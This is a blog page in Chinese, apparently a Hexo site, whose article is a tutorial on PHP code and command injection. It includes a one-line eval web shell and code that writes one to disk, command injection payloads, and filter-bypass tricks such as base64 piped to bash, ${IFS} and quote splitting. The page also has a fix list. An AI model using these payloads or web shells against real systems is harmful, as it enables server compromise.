+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/09/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/IIS/iis/">IIS</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Nginx
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/09/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Nginx/nginx/">Nginx</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Seeyon-OA(致远)
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/10/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Seeyon-OA(%E8%87%B4%E8%BF%9C)/seeyon-oa/">Seeyon-OA(致远)</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Tongda-OA(通达)
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/10/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Tongda-OA(%E9%80%9A%E8%BE%BE)/tongda-oa/">Tongda-OA(通达)</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Weaver-Ecology-OA(泛微)
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/10/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Weaver-Ecology-OA(%E6%B3%9B%E5%BE%AE)/weaver-oa/">Weaver-Ecology-OA(泛微)</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Weblogic
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/09/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Weblogic/weblogic/">Weblogic</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-【1】Web安全/命令注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/">【1】Web安全</a>
+    </div>
+
+                        
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+            <time datetime="2020-08-12T12:09:03.000Z" itemprop="datePublished">2020-08-12</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            命令注入漏洞
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+        
+        
+            <blockquote>
+<p>代码执行：可执行脚本语言代码</p>
+<p>命令执行：可执行系统(Linux、windows)命令</p>
+</blockquote>
+<h1 id="PHP敏感函数代码执行"><a href="#PHP敏感函数代码执行" class="headerlink" title="PHP敏感函数代码执行"></a>PHP敏感函数代码执行</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>()		<span class="comment">//把字符串作为PHP代码执行</span></span><br><span class="line">assert()	<span class="comment">//检查一个断言是否为 FALSE，可用来执行代码</span></span><br><span class="line">preg_replace()	<span class="comment">//执行一个正则表达式的搜索和替换</span></span><br><span class="line">call_user_func()<span class="comment">//把第一个参数作为回调函数调用</span></span><br><span class="line">call_user_func_array()<span class="comment">//调用回调函数，并把一个数组参数作为回调函数的参数</span></span><br><span class="line">array_map()		<span class="comment">//为数组的每个元素应用回调函数</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>eval：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"arg"</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>eval函数会将提交上来的值作为PHP代码处理，可以提交phpinfo(); 或者生成一句话shell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w+'</span>),<span class="string">'&lt;?php @eval($_POST[pass])?&gt;'</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>preg_replace：(5.5版本以上已废弃/e修饰符)</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> preg_replace(<span class="string">"//e"</span>,$_GET[<span class="string">'arg'</span>],<span class="string">"start testing..."</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当replacement 参数构成一个合理的php代码字符串的时候，/e 修正符将参数当做php代码执行</p>
+<p><strong>create_function:</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $test=$_GET[<span class="string">"test"</span>];$new_func=create_function(<span class="string">'$a,$b'</span>, $test);$new_func(<span class="number">2</span>,M_E);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在php 中使用create_function创建一个匿名函数（lambda-style） 如未对参数进行严格的过滤审查，可以通过提交特殊字符串给create_function执行任意代码.</p>
+<p><strong>使用${${ }}简单绕过：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $str=<span class="string">"echo \"Hello "</span>.$_GET[<span class="string">"arg"</span>].<span class="string">"!!\"; "</span>;<span class="keyword">eval</span>($str);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码使用反斜杠将echo后面的内容给转义了 与加addslashes()函数进行过滤是一样的 payload：<code>arg=${${phpinfo()}}</code></p>
+<h1 id="PHP程序执行函数"><a href="#PHP程序执行函数" class="headerlink" title="PHP程序执行函数"></a><a href="https://www.php.net/manual/zh/ref.exec.php" target="_blank" rel="noopener">PHP程序执行函数</a></h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system()		<span class="comment">//执行外部程序，并且显示输出</span></span><br><span class="line">exec()			<span class="comment">//执行一个外部程序</span></span><br><span class="line">shell_exec()	<span class="comment">//通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</span></span><br><span class="line">passthru()		<span class="comment">//执行外部程序并且显示原始输出</span></span><br><span class="line">pcntl_exec()	<span class="comment">//在当前进程空间执行指定程序</span></span><br><span class="line">popen()			<span class="comment">//打开进程文件指针</span></span><br><span class="line">proc_open()		<span class="comment">//执行一个命令，并且打开用来输入/输出的文件指针</span></span><br></pre></td></tr></table></figure>
+
+<p>最简单的例子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php $test &#x3D; $_GET[&#39;cmd&#39;]; system($test); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>?cmd=whoami</code>  这样即可执行系统命令</p>
+<p><strong>举一个类似DVWA里边的例子：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php$test &#x3D; $_GET[&#39;cmd&#39;];system(&quot;ping -c 3 &quot; . $test);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>?cmd=127.0.0.1;whoami</code></p>
+<p><strong>命令分隔符：</strong></p>
+<p><strong>在Linux上</strong>，上面的 ; 也可以用 |、|| 代替</p>
+<blockquote>
+<p>;前面的执行完执行后面的</p>
+<p>|是管道符，显示后面的执行结果</p>
+<p>||当前面的执行出错时执行后面的</p>
+<p>可用<strong>%0A</strong>换行执行命令</p>
+</blockquote>
+<p><strong>在Windows上</strong>，不能用 ; 可以用&amp;、&amp;&amp;、|、||代替</p>
+<blockquote>
+<p> &amp;前面的语句为假则直接执行后面的</p>
+<p> &amp;&amp;前面的语句为假则直接出错，后面的也不执行</p>
+<p> |直接执行后面的语句</p>
+<p>||前面出错执行后面的</p>
+</blockquote>
+<p>PHP 支持一个执行运算符：反引号（``） PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果与函数 shell_exec() 相同，都是以字符串的形式返回一个命令的执行结果，可以保存到变量中</p>
+<h1 id="命令执行绕过技巧"><a href="#命令执行绕过技巧" class="headerlink" title="命令执行绕过技巧"></a>命令执行绕过技巧</h1><p><strong>正则审查</strong></p>
+<blockquote>
+<p>是否使用多行模式修饰符（/foo/m）</p>
+<p>是否遗漏匹配对象末尾的换行符（/^\d+$/）</p>
+<p>是否允许空白字符（\s）</p>
+<p>是否误写反斜杠匹配模式（/\/） </p>
+</blockquote>
+<p>可用<strong>%0A</strong>换行执行命令，换行符自身是一个有效的<strong>目录分隔符</strong> </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 123/flag</span><br><span class="line">cat 123%0A flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>黑名单绕过</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$test = str_replace(<span class="string">"cat"</span>, <span class="string">""</span>, $test);</span><br><span class="line">$test = str_replace(<span class="string">"ls"</span>, <span class="string">""</span>, $test);</span><br><span class="line">$test = str_replace(<span class="string">" "</span>, <span class="string">""</span>, $test);</span><br><span class="line">$test = str_replace(<span class="string">"pwd"</span>, <span class="string">""</span>, $test);</span><br><span class="line">$test = str_replace(<span class="string">"wget"</span>, <span class="string">""</span>, $test);</span><br><span class="line">var_dump($test);</span><br><span class="line">system(<span class="string">"ls -al '$test'"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>shell特殊变量：</strong>ca$1t、ca$@t fla$@g </p>
+<p><strong>单引号、双引号：</strong> c””at、ca’’t、<strong>反斜线</strong> c\at</p>
+<p><strong>base64编码：</strong><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</code>、<strong>Hex编码：</strong> echo “63617420666c6167” | xxd -r -p|bash </p>
+<p><strong>利用变量：</strong> 执行ls命令： a=l;b=s;$a$b    <strong>cat 1.php文件内容：</strong> a=c;b=at;c=1.php;$a$b ${c}</p>
+<p><strong>绕过空格</strong> </p>
+<blockquote>
+<p>用<strong>${IFS}</strong>代替</p>
+<p>读取文件的时候利用重<strong>定向符cat&lt;flag</strong></p>
+<p>花括号无空格<strong>{cat,666.txt}</strong> </p>
+</blockquote>
+<p>$IFS可截断后边的内容，cat flag$IFS666.txt</p>
+<p><strong>长度限制</strong>，通过构造文件来绕过</p>
+<blockquote>
+<p>linux下可以用 1&gt;a创建文件名为a的空文件<br>ls -t&gt;test则会将目录按时间排序后写进test文件中<br>sh命令可以从一个文件中读取命令来执行</p>
+</blockquote>
+<p><strong>引号逃逸</strong></p>
+<p>恶意命令被扩在引号内，可用 \ 转义引号逃逸</p>
+<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><blockquote>
+<p>1、尽量不要使用以上的代码/命令执行函数</p>
+<p>2、使用disable_funtion()禁用以上函数</p>
+<p>3、过滤所有能当作命令分隔符使用的字符</p>
+</blockquote>
+<h1 id="相关的漏洞"><a href="#相关的漏洞" class="headerlink" title="相关的漏洞"></a>相关的漏洞</h1><p><a href="https://github.com/Medicean/VulApps/tree/master/b/bash" target="_blank" rel="noopener">bash破壳漏洞</a></p>
+<blockquote>
+<p>验证：env x=’() { :;}; echo vulnerable’ bash -c “echo this is a test”  </p>
+</blockquote>
+<p>Struts2远程命令执行</p>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    文件上传漏洞
+                
+            </div>
+        </a>
+    
+    
+        <a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">XML实体注入漏洞</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            wintrysec &copy; 2020 
+            <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme - <a href="https://github.com/zthxxx/hexo-theme-Wikitten" target="_blank" rel="noopener">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
